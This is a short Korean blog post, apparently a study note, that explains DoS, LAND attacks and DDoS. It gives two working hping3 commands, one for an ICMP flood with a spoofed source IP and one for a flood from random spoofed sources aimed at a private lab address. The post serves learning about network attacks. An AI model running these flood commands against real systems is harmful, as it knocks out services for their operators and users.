---

layout: single
title: DoS 공격 - LAND ATTACK, DDoS
categories: 정보보안

---

&nbsp;&nbsp;hping3를 이용해 DoS 공격을 시도해보자. 

<h2>DoS</h2>

&nbsp;&nbsp;Denial of Service의 약자로 피해자에게 과도한 트래픽을 줘서 정상적인 처리를 하지 못하도록 하는 것이다. 다양한 종류가 있으나 여기선 <strong>LAND Attack</strong>과 <strong>DDoS</strong>에 대해 알아보자.

<h2>LAND Attack</h2>

&nbsp;&nbsp;Land Attack이란 source ip(송신자의 ip)와 destination ip(수신자의 ip)를 같게 만들어 공격하는 방법이다. 자신의 IP를 변조해 공격을 하기 떄문에 이는 Ip Spoofing에 해당된다.

 

```
hping3 -a [변조할 ip] [수신자의 ip] --icmp --flood
```

`--flood`: 좀 더 패킷을 빠르게 보내기 위해 사용하는 옵션

<h2>DDoS</h2>

&nbsp;&nbsp;Distributed Denial of Service 분산 서비스 거부 공격을 의미한다. 여러대의 공격자가 피해자에게 부하를 줘서 서비스를 정상적으로 하지 못하게 만드는 공격이다. 

&nbsp;&nbsp;hping3의 rand 옵션을 사용해 source ip를 변조해 여러대의 PC에서 패킷을 전송한 것처럼 공격할 수 있다.

```
hping3 --rand-source --flood --icmp 192.168.8.131
```
`--rand-source`: 발신 ip를 랜덤하게 변조해서 송신

